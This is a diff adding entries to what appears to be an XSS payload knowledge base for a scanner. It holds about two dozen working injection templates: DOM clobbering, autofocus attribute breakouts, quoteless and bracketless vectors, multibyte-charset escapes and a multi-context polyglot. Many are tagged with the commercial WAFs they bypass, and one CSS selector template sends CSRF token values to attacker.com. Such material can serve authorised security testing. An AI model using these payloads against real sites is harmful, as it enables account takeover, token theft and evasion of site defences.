@@ -210,6 +210,17 @@ class PayloadKnowledgeBase:
             cvss_score=7.8,
         ),
         PayloadEntry(
+            id="dom_clobber_config_url_entity_quoteless",
+            name="Quoteless Entity-Encoded window.config.url Clobber",
+            template="<a id=config><a id=config name=url href=&#106;ava&#115;cript:parent.__XSS__&#40;&#39;{{TOKEN}}&#39;&#41;>",
+            category=XSSCategory.DOM_CLOBBERING,
+            contexts=[InjectionContext.HTML_TEXT, InjectionContext.RICH_TEXT_HTML],
+            description="Clobbers a nested window.config.url lookup while numeric entities keep the executable URL free of raw quotes, parentheses, slashes, and the javascript keyword.",
+            tags=["dom_clobbering", "window_config", "numeric_entities", "char_restricted"],
+            cwe_id=79,
+            cvss_score=7.8,
+        ),
+        PayloadEntry(
             id="dom_clobber_form_name_hierarchy",
             name="DOM Clobbering Named Form Element Array",
             template="<form id=\"authConfig\"><a id=\"authConfig\" name=\"targetUrl\" href=\"javascript:__XSS__('{{TOKEN}}')\"></a></form>",
@@ -387,6 +398,16 @@ class PayloadKnowledgeBase:
             cvss_score=7.5,
         ),
         PayloadEntry(
+            id="event_unquoted_attr_autofocus",
+            name="Unquoted Attribute Autofocus Breakout",
+            template="x tabindex=0 autofocus onfocus=__XSS__('{{TOKEN}}')",
+            category=XSSCategory.REFLECTED,
+            contexts=[InjectionContext.ATTR_UNQUOTED],
+            description="Terminates an unquoted attribute with whitespace and adds a focusable autofocus event target.",
+            tags=["event_handler", "attribute_breakout", "unquoted", "zero_interaction"],
+            cvss_score=7.5,
+        ),
+        PayloadEntry(
             id="event_input_content_visibility",
             name="Content-Visibility Auto State Change Event",
             template="<input type=\"hidden\" oncontentvisibilityautostatechange=\"__XSS__('{{TOKEN}}')\" style=\"content-visibility:auto\">",
@@ -537,6 +558,17 @@ class PayloadKnowledgeBase:
             cvss_score=7.5,
         ),
         PayloadEntry(
+            id="no_parens_quotes_details_tagged_template",
+            name="Quote-Free Parentheseless Details Tagged Template",
+            template="<details open ontoggle=__XSS__`{{TOKEN}}`>",
+            category=XSSCategory.CHAR_RESTRICTED,
+            contexts=[InjectionContext.HTML_TEXT],
+            description="Uses an auto-triggering details event and a tagged template call when quotes and parentheses are unavailable.",
+            tags=["char_restricted", "no_parentheses", "no_quotes", "zero_interaction"],
+            blocked_chars_tolerated={"(", ")", "'", '"'},
+            cvss_score=7.8,
+        ),
+        PayloadEntry(
             id="no_quotes_string_fromcharcode",
             name="Quoteless Execution via String.fromCharCode",
             template="<img src=x onerror=\"eval(String.fromCharCode(95,95,88,83,83,95,95,40,39,123,123,84,79,75,69,78,125,125,39,41))\">",
@@ -650,6 +682,109 @@ class PayloadKnowledgeBase:
             bypasses_wafs=["cloudflare", "akamai", "aws_waf", "imperva", "modsecurity"],
             cvss_score=8.0,
         ),
+        PayloadEntry(
+            id="waf_regex_source_quoteless",
+            name="Quoteless Execution via RegExp Source Property",
+            template="<svg onload=__XSS__(/{{TOKEN}}/.source)>",
+            category=XSSCategory.WAF_EVASION,
+            contexts=[InjectionContext.HTML_TEXT, InjectionContext.SVG_NAMESPACE],
+            description="Executes without single quotes, double quotes, or backticks by utilizing RegExp literal .source extraction to satisfy callback token requirements.",
+            tags=["waf_evasion", "quoteless", "regex_source"],
+            bypasses_wafs=["cloudflare", "akamai", "aws_waf", "imperva", "f5_big_ip"],
+            blocked_chars_tolerated={"'", '"', "`"},
+            cvss_score=8.0,
+        ),
+        PayloadEntry(
+            id="waf_in_tag_autofocus_no_brackets",
+            name="Attribute Breakout without Angle Brackets via Autofocus",
+            template='" onfocus=__XSS__(\'{{TOKEN}}\') autofocus="',
+            category=XSSCategory.WAF_EVASION,
+            contexts=[InjectionContext.ATTR_QUOTED_DOUBLE],
+            description="Achieves zero-interaction reflected execution inside double-quoted attributes without angle brackets < or >.",
+            tags=["waf_evasion", "bracketless", "autofocus", "event_injection"],
+            bypasses_wafs=["modsecurity", "cloudflare", "aws_waf", "imperva"],
+            blocked_chars_tolerated={"<", ">"},
+            cvss_score=8.0,
+        ),
+        PayloadEntry(
+            id="waf_in_tag_autofocus_sq_no_brackets",
+            name="Single-Quoted Attribute Breakout without Angle Brackets via Autofocus",
+            template="' onfocus=__XSS__('{{TOKEN}}') autofocus='",
+            category=XSSCategory.WAF_EVASION,
+            contexts=[InjectionContext.ATTR_QUOTED_SINGLE],
+            description="Achieves zero-interaction execution in single-quoted attribute without angle brackets.",
+            tags=["waf_evasion", "bracketless", "autofocus", "event_injection"],
+            bypasses_wafs=["modsecurity", "cloudflare", "aws_waf", "imperva"],
+            blocked_chars_tolerated={"<", ">"},
+            cvss_score=8.0,
+        ),
+        PayloadEntry(
+            id="waf_details_ontoggle_autotrigger",
+            name="WAF Evasion via Details Ontoggle Self-Trigger",
+            template="<details open ontoggle=__XSS__('{{TOKEN}}')>",
+            category=XSSCategory.WAF_EVASION,
+            contexts=[InjectionContext.HTML_TEXT],
+            description="Evades WAFs that inspect script/img/svg elements by leveraging the HTML5 details open ontoggle event.",
+            tags=["waf_evasion", "details_tag", "ontoggle", "modern"],
+            bypasses_wafs=["cloudflare", "akamai", "aws_waf", "imperva"],
+            cvss_score=8.0,
+        ),
+        PayloadEntry(
+            id="waf_script_close_js_string_breakout",
+            name="Script Tag Close Breakout from Encapsulated JS String",
+            template="</script><svg onload=__XSS__('{{TOKEN}}')>",
+            category=XSSCategory.WAF_EVASION,
+            contexts=[InjectionContext.JS_STRING_DOUBLE, InjectionContext.JS_STRING_SINGLE, InjectionContext.JS_TEMPLATE_LITERAL],
+            description="Terminates the script parser mode directly, defeating filters that sanitize internal JS quotes or escape backslashes.",
+            tags=["waf_evasion", "script_close", "context_breaking"],
+            bypasses_wafs=["cloudflare", "akamai", "aws_waf"],
+            blocked_chars_tolerated={"'", '"', ";", "\\"},
+            cvss_score=8.2,
+        ),
+        PayloadEntry(
+            id="waf_svg_animate_onbegin",
+            name="SVG Animate OnBegin Execution",
+            template='<svg><animate attributeName="x" dur="1s" onbegin=__XSS__(\'{{TOKEN}}\')>',
+            category=XSSCategory.WAF_EVASION,
+            contexts=[InjectionContext.HTML_TEXT, InjectionContext.SVG_NAMESPACE],
+            description="SMIL SVG animation trigger event onbegin bypassing tag and attribute event blocklists.",
+            tags=["waf_evasion", "svg_smil", "onbegin", "pdf_intel"],
+            bypasses_wafs=["cloudflare", "akamai", "imperva", "modsecurity"],
+            cvss_score=8.1,
+        ),
+        PayloadEntry(
+            id="waf_marquee_onstart",
+            name="Marquee OnStart Self-Executing Vector",
+            template="<marquee onstart=__XSS__('{{TOKEN}}')>",
+            category=XSSCategory.WAF_EVASION,
+            contexts=[InjectionContext.HTML_TEXT],
+            description="HTML marquee element onstart event triggering immediately upon render without user interaction.",
+            tags=["waf_evasion", "marquee", "onstart", "pdf_intel"],
+            bypasses_wafs=["aws_waf", "cloudflare", "imperva"],
+            cvss_score=8.0,
+        ),
+        PayloadEntry(
+            id="waf_audio_src_onerror",
+            name="Audio Element OnError Vector",
+            template="<audio src=x onerror=__XSS__('{{TOKEN}}')>",
+            category=XSSCategory.WAF_EVASION,
+            contexts=[InjectionContext.HTML_TEXT],
+            description="HTML5 audio media error event handler evading image/script specific WAF signatures.",
+            tags=["waf_evasion", "audio_tag", "onerror", "pdf_intel"],
+            bypasses_wafs=["modsecurity", "cloudflare", "aws_waf"],
+            cvss_score=7.8,
+        ),
+        PayloadEntry(
+            id="waf_blind_css_token_exfil",
+            name="Blind CSS Attribute Selector Exfiltration",
+            template='input[name="csrf"][value^="{{TOKEN}}"]{background:url(//attacker.com/exfil?c={{TOKEN}})}',
+            category=XSSCategory.WAF_EVASION,
+            contexts=[InjectionContext.HTML_TEXT, InjectionContext.CSS_PROPERTY],
+            description="Data exfiltration via CSS attribute selectors evading strict CSP script-src (learned from Blind CSS Exfiltration slides).",
+            tags=["waf_evasion", "css_exfil", "csp_bypass", "pdf_intel"],
+            bypasses_wafs=["cloudflare", "akamai", "imperva"],
+            cvss_score=7.5,
+        ),
 
         # =========================================================================
         # 9. ADVANCED CONTEXT BREAKOUTS (ES6 TEMPLATES, JSON, CSS)
@@ -748,6 +883,138 @@ class PayloadKnowledgeBase:
             tags=["idn", "punycode", "domain_evasion"],
             cvss_score=7.5,
         ),
+
+        # =========================================================================
+        # 11. ADVANCED PARSER QUIRKS, MULTI-BYTE & XML SINK PRIMITIVES (JACK MASA TAXONOMY)
+        # =========================================================================
+        PayloadEntry(
+            id="comment_breakout_unicode_line_separator_2028",
+            name="JS Single-Line Comment Breakout via Unicode Line Separator (U+2028)",
+            template="//\u2028__XSS__('{{TOKEN}}');//",
+            category=XSSCategory.CHAR_RESTRICTED,
+            contexts=[InjectionContext.COMMENT_BLOCK, InjectionContext.JS_BLOCK, InjectionContext.JS_STRING_DOUBLE],
+            description="Escapes single-line JavaScript comment without CR/LF by utilizing ECMAScript line terminator U+2028.",
+            tags=["comment_breakout", "unicode_line_separator", "u2028", "js_parser"],
+            blocked_chars_tolerated={"\r", "\n"},
+            cvss_score=7.8,
+        ),
+        PayloadEntry(
+            id="comment_breakout_unicode_para_separator_2029",
+            name="JS Single-Line Comment Breakout via Unicode Paragraph Separator (U+2029)",
+            template="//\u2029__XSS__('{{TOKEN}}');//",
+            category=XSSCategory.CHAR_RESTRICTED,
+            contexts=[InjectionContext.COMMENT_BLOCK, InjectionContext.JS_BLOCK, InjectionContext.JS_STRING_DOUBLE],
+            description="Escapes single-line JavaScript comment without CR/LF by utilizing ECMAScript paragraph terminator U+2029.",
+            tags=["comment_breakout", "unicode_para_separator", "u2029", "js_parser"],
+            blocked_chars_tolerated={"\r", "\n"},
+            cvss_score=7.8,
+        ),
+        PayloadEntry(
+            id="multibyte_gbk_quote_eating_escape",
+            name="Multi-byte GBK/Big5 Backslash Absorption Escape",
+            template="%bb\"__XSS__('{{TOKEN}}');//",
+            category=XSSCategory.WAF_EVASION,
+            contexts=[InjectionContext.JS_STRING_DOUBLE, InjectionContext.ATTR_QUOTED_DOUBLE],
+            description="Exploits multi-byte charset decoding where backend escaping (\\\" -> %5C%22) combines with %bb to form a valid multi-byte character (0xBB5C), leaving quote unescaped.",
+            tags=["multibyte", "gbk", "backslash_eater", "encoding"],
+            bypasses_wafs=["cloudflare", "modsecurity", "imperva"],
+            cvss_score=8.1,
+        ),
+        PayloadEntry(
+            id="attr_inline_event_named_entity_breakout",
+            name="Attribute Inline Event Handler Named Entity Quote Breakout",
+            template="&quot;),__XSS__('{{TOKEN}}')//",
+            category=XSSCategory.CHAR_RESTRICTED,
+            contexts=[InjectionContext.EVENT_HANDLER_ATTR, InjectionContext.ATTR_QUOTED_DOUBLE],
+            description="HTML entity &quot; or &apos; resolves inside event handler attributes prior to JS interpretation, breaking out of quoted JS arguments.",
+            tags=["entity_resolution", "inline_event", "attribute_breakout"],
+            blocked_chars_tolerated={'\"', "'"},
+            cvss_score=7.5,
+        ),
+        PayloadEntry(
+            id="attr_inline_event_numeric_entity_breakout",
+            name="Attribute Inline Event Handler Numeric Entity Breakout",
+            template="&#34;),__XSS__('{{TOKEN}}')//",
+            category=XSSCategory.CHAR_RESTRICTED,
+            contexts=[InjectionContext.EVENT_HANDLER_ATTR, InjectionContext.ATTR_QUOTED_DOUBLE],
+            description="Decimal/hex entities (&#34;, &#x22;) resolve in HTML attribute values before script compilation.",
+            tags=["entity_resolution", "numeric_entity", "inline_event"],
+            blocked_chars_tolerated={'\"', "'"},
+            cvss_score=7.5,
+        ),
+        PayloadEntry(
+            id="xml_svg_xlink_href_script_data_uri",
+            name="SVG Script Namespace xlink:href Data URI Sink",
+            template="<svg><script xlink:href=\"data:,__XSS__('{{TOKEN}}')\"></script></svg>",
+            category=XSSCategory.MUTATION_XSS,
+            contexts=[InjectionContext.HTML_TEXT, InjectionContext.SVG_NAMESPACE],
+            description="SVG XML script element executing data URI via xlink:href attribute in SVG namespace.",
+            tags=["svg", "xlink", "namespace_sink", "data_uri"],
+            cvss_score=7.8,
+        ),
+        PayloadEntry(
+            id="xml_mathml_xlink_href_javascript_uri",
+            name="MathML Anchor xlink:href JavaScript Execution Sink",
+            template="<math><a xlink:href=\"javascript:__XSS__('{{TOKEN}}')\">click</a></math>",
+            category=XSSCategory.MUTATION_XSS,
+            contexts=[InjectionContext.HTML_TEXT, InjectionContext.MATHML_NAMESPACE],
+            description="MathML hyperlink element using XML xlink:href namespace to evaluate JavaScript URI.",
+            tags=["mathml", "xlink", "javascript_uri"],
+            cvss_score=7.5,
+        ),
+        PayloadEntry(
+            id="xml_svg_style_font_family_mutation",
+            name="SVG Style Block Font-Family Parser Mutation",
+            template="<svg><style>*{font-family:'<svg onload=__XSS__(\\'{{TOKEN}}\\')>';}</style></svg>",
+            category=XSSCategory.MUTATION_XSS,
+            contexts=[InjectionContext.HTML_TEXT, InjectionContext.SVG_NAMESPACE, InjectionContext.CSS_PROPERTY],
+            description="Exploits parser differential when CSS string delimiters in SVG style block are improperly sanitized by mXSS sanitizers.",
+            tags=["mxss", "svg_style", "font_family"],
+            cvss_score=8.2,
+        ),
+        PayloadEntry(
+            id="dom_clobbering_form_window_name",
+            name="DOM Clobbering Form window.name Clobbering",
+            template="<form id=\"window\"><input name=\"name\" value=\"javascript:__XSS__('{{TOKEN}}')\"></form>",
+            category=XSSCategory.DOM_CLOBBERING,
+            contexts=[InjectionContext.HTML_TEXT, InjectionContext.RICH_TEXT_HTML],
+            description="Clobbers global window.name or document.name reference using named form and input elements.",
+            tags=["dom_clobbering", "window_name", "form_clobber"],
+            cvss_score=7.8,
+        ),
+        PayloadEntry(
+            id="html_token_delimiter_formfeed_vertical_tab",
+            name="HTML Token Separator Evasion via Form Feed and Vertical Tab",
+            template="<img\x0csrc=x\x0conerror=__XSS__('{{TOKEN}}')>",
+            category=XSSCategory.CHAR_RESTRICTED,
+            contexts=[InjectionContext.HTML_TEXT],
+            description="Uses HTML5 whitespace token separator Form Feed (0x0C) or Vertical Tab (0x0B) to bypass space-only filters.",
+            tags=["char_restricted", "form_feed", "token_separator", "spaceless"],
+            blocked_chars_tolerated={" ", "\t"},
+            cvss_score=7.5,
+        ),
+        PayloadEntry(
+            id="polyglot_somdev_multi_context",
+            name="Somdev Multi-Context Universal XSS Polyglot",
+            template="%0ajavascript:`/*\"/*-->&lt;svg onload='/*</template></noembed></noscript></style></title></textarea></script><html onmouseover=\"/**/ __XSS__('{{TOKEN}}')//\">",
+            category=XSSCategory.WAF_EVASION,
+            contexts=[
+                InjectionContext.HTML_TEXT,
+                InjectionContext.ATTR_QUOTED_DOUBLE,
+                InjectionContext.ATTR_QUOTED_SINGLE,
+                InjectionContext.JS_STRING_DOUBLE,
+                InjectionContext.JS_STRING_SINGLE,
+                InjectionContext.JS_TEMPLATE_LITERAL,
+                InjectionContext.COMMENT_BLOCK,
+                InjectionContext.URL_HREF,
+                InjectionContext.URL_SRC,
+                InjectionContext.RICH_TEXT_HTML,
+            ],
+            description="Somdev Sangwan (@s0md3v) multi-context polyglot breaking HTML body, attributes, RCDATA elements (textarea, style, script), quotes, backticks, and comments.",
+            tags=["polyglot", "universal", "multi_context", "rcdata_breakout", "somdev"],
+            bypasses_wafs=["cloudflare", "aws_waf", "imperva", "modsecurity"],
+            cvss_score=8.5,
+        ),
     ]
 
     @classmethod
@@ -816,7 +1083,12 @@ class PayloadKnowledgeBase:
             for p in results:
                 has_hard_blocked = False
                 for char in blocked_characters:
-                    if char in p.template and char not in p.blocked_chars_tolerated:
+                    raw_constraint = str(char)
+                    if len(raw_constraint) == 1:
+                        present = raw_constraint in p.template
+                    else:
+                        present = raw_constraint.lower() in p.template.lower()
+                    if present and raw_constraint not in p.blocked_chars_tolerated:
                         has_hard_blocked = True
                         break
                 if not has_hard_blocked:
@@ -885,7 +1157,10 @@ class PayloadKnowledgeBase:
         fn = "confirm" if "alert" in blocked_keywords else ("prompt" if "alert" in blocked_keywords else "alert")
 
         candidates = []
-        if "ATTR" in ctx_str:
+        if "ATTR_UNQUOTED" in ctx_str.upper():
+            if dq_ok or sq_ok:
+                candidates.append(f"x tabindex=0 autofocus onfocus={fn}({arg})")
+        elif "ATTR" in ctx_str:
             if dq_ok:
                 candidates.append(f'" onfocus={fn}({arg}) autofocus="')
             if sq_ok:
